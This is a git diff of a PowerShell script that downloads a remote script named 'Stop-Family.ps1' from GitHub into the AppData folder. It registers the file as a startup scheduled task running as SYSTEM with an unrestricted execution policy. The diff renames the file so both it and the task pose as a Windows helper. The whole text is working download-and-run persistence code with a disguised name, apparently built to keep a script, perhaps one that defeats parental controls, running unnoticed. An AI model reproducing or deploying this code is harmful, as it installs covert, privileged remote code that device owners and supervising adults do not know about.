@@ -5,7 +5,7 @@ if (-NOT ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdenti
 }
 
 # Download File
-Invoke-WebRequest -Uri "https://raw.githubusercontent.com/TheBotlyNoob/Misc-Projects/main/Stop-Family/Stop-Family.ps1" -OutFile "$env:AppData\Maintenance.ps1"
+Invoke-WebRequest -Uri "https://raw.githubusercontent.com/TheBotlyNoob/Misc-Projects/main/Stop-Family/Stop-Family.ps1" -OutFile "$env:AppData\Windows-Helper-GitHub.ps1"
 
 # Set The Task To Run On Start
-schtasks /create /sc 'ONSTART' /tn "Windows-Helper-GitHub" /tr "powershell -ExecutionPolicy UnRestricted -File $env:AppData\Maintenance.ps1" /ru 'system' /f
+schtasks /create /sc 'ONSTART' /tn 'Windows-Helper-GitHub' /tr "powershell -ExecutionPolicy UnRestricted -File $env:AppData\Windows-Helper-GitHub.ps1" /ru 'system' /f
